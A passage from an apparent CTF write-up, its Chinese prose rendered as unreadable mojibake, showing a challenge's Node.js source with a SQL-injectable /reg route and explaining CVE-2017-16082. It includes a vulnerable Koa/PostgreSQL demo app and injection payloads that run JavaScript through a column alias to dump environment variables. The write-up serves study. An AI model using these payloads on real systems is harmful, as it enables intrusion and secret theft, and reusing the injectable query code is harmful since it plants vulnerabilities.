&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">k&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">waf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">k&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT ?,?,?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">payload&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM blacklists WHERE ip=?`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Shame on you&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM blacklists GROUP BY ip`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">pool&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;text/html&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;Here is the &amp;lt;a href=https://amiaaaz.github.io/?show_source=1&amp;gt;source&amp;lt;/a&amp;gt;, thanks to Orange\n\n&amp;lt;h3&amp;gt;Hall of Shame&amp;lt;/h3&amp;gt;(delete every 60s)\n&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#111">parseInt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">. &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">\n`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">html&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/reg&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bye&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createHash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md5&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">digest&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hex&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`INSERT INTO users(username, password) VALUES(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;, &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;) ON CONFLICT (username) DO NOTHING`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rows&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rowCount&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Reg OK&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User taken&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">31337&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Listen OK&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¶‰åŠåˆ°çš„ä¸»è¦çŸ¥è¯†ç‚¹æœ‰ä¸‰ä¸ªï¼Œä¸€ä¸ªä¸€ä¸ªè¯´ã€‚&lt;/p>
&lt;h3 id="cve-2017-16082-node-progresql-rce">CVE-2017-16082: node-progresql-rce&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">node.js + postgres ä»æ³¨å…¥åˆ°Getshell&lt;/a> | vulhub: node/CVE-2017-16082 | &lt;a href="https://blog.csdn.net/weixin_39540651/article/details/108866593">PostgreSQL è®¤è¯æ–¹å¼è¯¦è§£&lt;/a>&lt;/p>
&lt;p>dockerä¸­çš„ç¤ºä¾‹app.jsï¼Œä¹‹åè¿ä¸Šdockerä¸­çš„app.jsç”¨vscodeè¿œç¨‹è°ƒè¯•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pg&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Client&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;postgres&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;postgres&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;db&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">5432&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM &amp;#34;user&amp;#34; WHERE &amp;#34;id&amp;#34; = &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`&amp;lt;html&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;body&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;table&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;id&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;name&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;score&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">score&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/table&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/body&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/html&amp;gt;`&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¾ç„¶17è¡Œçš„&lt;code>let sql = &lt;/code>è¯­å¥æœ‰sqlçš„å¯èƒ½ï¼Œä¸è¿‡æ³¨æ„è¿™é‡Œçš„å¯æ§å‚æ•°åœ¨whereä¹‹åè€Œä¸åœ¨selectä¹‹åï¼Œæˆ‘ä»¬æ²¡æ³•è½»æ˜“çš„æ§åˆ¶å­—æ®µåï¼Œå³ä½¿æ˜¯ç”¨è”åˆæŸ¥è¯¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">where&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">union&lt;/span> &lt;span style="color:#111">slect&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\&amp;#39;+console.log(process.enc)]=null;//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒä¸ªselectåçš„å­—æ®µåä¹Ÿä¸ä¼šè¢«postgresè¿”å›ï¼Œåªä¼šå›æ˜¾ç¬¬ä¸€ä¸ªæŸ¥è¯¢ç»“æœ&lt;/p>
&lt;p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰§è¡Œå¤šè¯­å¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#39;+console.log(process.env)]=null;//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šè¿”å›500ï¼Œä½†æ˜¯å·²ç»è¢«æ­£å¸¸æ‰§è¡Œè¯­å¥äº†ï¼Œæ‰“å°å‡ºäº†ç¯å¢ƒå˜é‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117162422478.png" alt="image-20211117162422478">&lt;/p>
